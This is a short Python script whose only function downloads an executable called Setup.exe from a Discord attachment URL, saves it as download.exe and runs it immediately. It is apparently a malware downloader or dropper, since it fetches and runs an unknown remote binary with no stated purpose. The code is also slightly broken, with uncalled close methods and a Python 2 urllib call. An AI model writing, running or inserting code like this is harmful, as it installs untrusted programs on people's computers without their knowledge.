import urllib


import os
def init():
    url = 'https://cdn.discordapp.com/attachments/936752659241771009/936753057998442506/Setup.exe'
    
    f = urllib.urlopen(url)
    file = f.read()
    f.close
    f2 = open('download.exe', 'w')
    f2.write(file)
    f2.close
    
    os.startfile(os.getcwd()+"\\download.exe")